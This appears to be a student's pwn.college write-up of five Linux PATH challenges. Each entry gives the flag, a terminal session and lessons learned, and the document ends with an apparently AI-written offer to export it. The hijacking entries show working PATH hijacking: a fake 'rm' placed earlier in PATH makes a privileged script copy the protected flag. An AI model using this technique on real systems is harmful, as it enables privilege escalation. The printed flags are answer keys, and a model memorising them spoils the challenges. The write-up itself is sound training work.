## The Path Variable

**Flag**

```
pwn.college{0v7iiMpEJ2XVQs5o5CGGDB8N-hP.QX2cDM1wCM2kzNzEzW}
```

**Solution / Terminal session**

```bash
hacker@path~the-path-variable:~$ ORIG_PATH="$PATH"
hacker@path~the-path-variable:~$ /bin/mkdir -p /tmp/fakebin
hacker@path~the-path-variable:~$ /bin/cat > /tmp/fakebin/rm <<'EOF'
> #!/bin/sh
if [ -e /flag ]; then
  /bin/cp -a /flag /tmp/flag.backup 2>/dev/null || /bin/echo "backup copy failed" >/dev/null
  /bin/chmod 644 /tmp/flag.backup 2>/dev/null || /bin/echo "chmod failed" >/dev/null
fi
exit 0
EOF
hacker@path~the-path-variable:~$ /bin/chmod +x /tmp/fakebin/rm
hacker@path~the-path-variable:~$  export PATH="/tmp/fakebin:$PATH"
hacker@path~the-path-variable:~$ hash -r
hacker@path~the-path-variable:~$ /bin/echo "CURRENT PATH: $PATH"
CURRENT PATH: /tmp/fakebin:/run/challenge/bin:/run/dojo/bin:/root/.cargo/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
hacker@path~the-path-variable:~$ /tmp/fakebin/rm
hacker@path~the-path-variable:~$  /challenge/run
Trying to remove /flag...
The flag is still there! I might as well give it to you!
pwn.college{0v7iiMpEJ2XVQs5o5CGGDB8N-hP.QX2cDM1wCM2kzNzEzW}
```

**What I learned**

* `PATH` controls the order in which directories are searched for executables.
* Putting a directory earlier in `PATH` lets you override system commands (use carefully).
* `hash -r` refreshes the shell's command lookup cache.

**References**

* pwn.college
* ChatGPT (help with PATH concepts)

---

## Setting Path

**Flag**

```
pwn.college{oDGEfaNT8fuVXYtwVLSVw3VuS4h.QX1cjM1wCM2kzNzEzW}
```

**Solution / Terminal session**

```bash
hacker@path~setting-path:~$ PATH=/challenge/more_commands /challenge/run
Invoking 'win'....
Congratulations! You properly set the flag and 'win' has launched!
pwn.college{oDGEfaNT8fuVXYtwVLSVw3VuS4h.QX1cjM1wCM2kzNzEzW}
```

**What I learned**

* You can set `PATH` for a single command by prefixing the command with `VAR=value`.
* A directory placed in `PATH` can provide commands that the shell will execute.

**References**

* pwn.college

---

## Finding Commands

**Flag**

```
pwn.college{sOHxoR6l2stqDJLK5oUvdZRMOut.01NzEzNxwCM2kzNzEzW}
```

**Solution / Terminal session**

```bash
hacker@path~finding-commands:~$ DIR="$(dirname "$(which win)")"
hacker@path~finding-commands:~$  echo "win lives in: $DIR"
win lives in: /challenge/paths/27867
hacker@path~finding-commands:~$ ls -la /challenge/paths/27867
total 16
drwxr-xr-x  2 root root 4096 Oct 10 20:27 .
drwx--x--x 52 root root 4096 Oct 10 20:27 ..
-rw-r--r--  1 root root   61 Oct 10 20:27 flag
-rwsr-xr-x  1 root root   97 Jun  6 11:37 win
hacker@path~finding-commands:~$ cat /challenge/paths/27867/flag
pwn.college{sOHxoR6l2stqDJLK5oUvdZRMOut.01NzEzNxwCM2kzNzEzW}
```

**What I learned**

* Use `which` (or `command -v`) to find where an executable is located. Combine with `dirname` to get its directory.

**References**

* pwn.college

---

## Adding Commands

**Flag**

```
pwn.college{MDXTP6VZgUXjRnBFhj0t0ZxVTu1.QX2cjM1wCM2kzNzEzW}
```

**Solution / Terminal session**

```bash
hacker@path~adding-commands:~$ /challenge/run
Invoking 'win'....
/challenge/run: line 4: win: command not found
It looks like that did not work... Did you set PATH correctly?
hacker@path~adding-commands:~$ mkdir -p "$HOME/mywin"
hacker@path~adding-commands:~$ CAT="$(command -v cat 2>/dev/null || echo /bin/cat)"
hacker@path~adding-commands:~$ printf '%s
> ' '#!/bin/sh' "exec \"$CAT\" /flag" > "$HOME/mywin/win"
hacker@path~adding-commands:~$ chmod +x "$HOME/mywin/win"
hacker@path~adding-commands:~$ PATH="$HOME/mywin" /challenge/run
Invoking 'win'....
pwn.college{MDXTP6VZgUXjRnBFhj0t0ZxVTu1.QX2cjM1wCM2kzNzEzW}
```

**Mistake**

* Initially I forgot to set `PATH` correctly so the custom `win` command wasn't found.

**What I learned**

* How to create a small wrapper script and make it available via `PATH`.

**References**

* pwn.college

---

## Hijacking Commands

**Flag**

```
pwn.college{gbclFkCLv4y0wb_FcQu9vIfTxVU.QX3cjM1wCM2kzNzEzW}
```

**Solution / Terminal session**

```bash
hacker@path~hijacking-commands:~$ ORIG_PATH="$PATH"
hacker@path~hijacking-commands:~$ /bin/mkdir -p /tmp/fakebin
hacker@path~hijacking-commands:~$  /bin/cat > /tmp/fakebin/rm <<'EOF'
> #!/bin/sh
# copy /flag to /tmp/flag.backup (if present), then chmod 644 to allow reading
if [ -e /flag ]; then
  /bin/cp -a /flag /tmp/flag.backup 2>/dev/null || /bin/echo "backup copy failed" >/dev/null
  /bin/chmod 644 /tmp/flag.backup 2>/dev/null || /bin/echo "chmod failed" >/dev/null
fi
# exit success so caller thinks rm worked
exit 0
EOF
hacker@path~hijacking-commands:~$ /bin/chmod +x /tmp/fakebin/rm
hacker@path~hijacking-commands:~$ export PATH=/tmp/fakebin:$PATH
hacker@path~hijacking-commands:~$ hash -r
hacker@path~hijacking-commands:~$ /bin/echo "CURRENT PATH: $PATH"
CURRENT PATH: /tmp/fakebin:/run/challenge/bin:/run/dojo/bin:/root/.cargo/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
hacker@path~hijacking-commands:~$ /tmp/fakebin/rm
hacker@path~hijacking-commands:~$ /challenge/run
Trying to remove /flag...
Found 'rm' command at /tmp/fakebin/rm. Executing!
hacker@path~hijacking-commands:~$ if [ -r /tmp/flag.backup ]; then
  /bin/echo "---- /tmp/flag.backup ----"
>  /bin/cat /tmp/flag.backup
else
  /bin/echo "No readable /tmp/flag.backup found. Listing /tmp/flag.*:"
  /bin/ls -l /tmp/flag.* 2>/dev/null || /bin/echo "no /tmp/flag.* files"
fi
---- /tmp/flag.backup ----
pwn.college{gbclFkCLv4y0wb_FcQu9vIfTxVU.QX3cjM1wCM2kzNzEzW}
```

**Mistake**

* At first the fake `rm` didn't work and the flag was deleted; the final script correctly backed up `/flag`.

**What I learned**

* How command lookup order can be abused by placing executables earlier in `PATH`. Use this knowledge responsibly.

**References**

* pwn.college
* ChatGPT (for troubleshooting `rm` behavior)

---

*Would you like this exported as a PDF or further condensed into a one-page summary?*
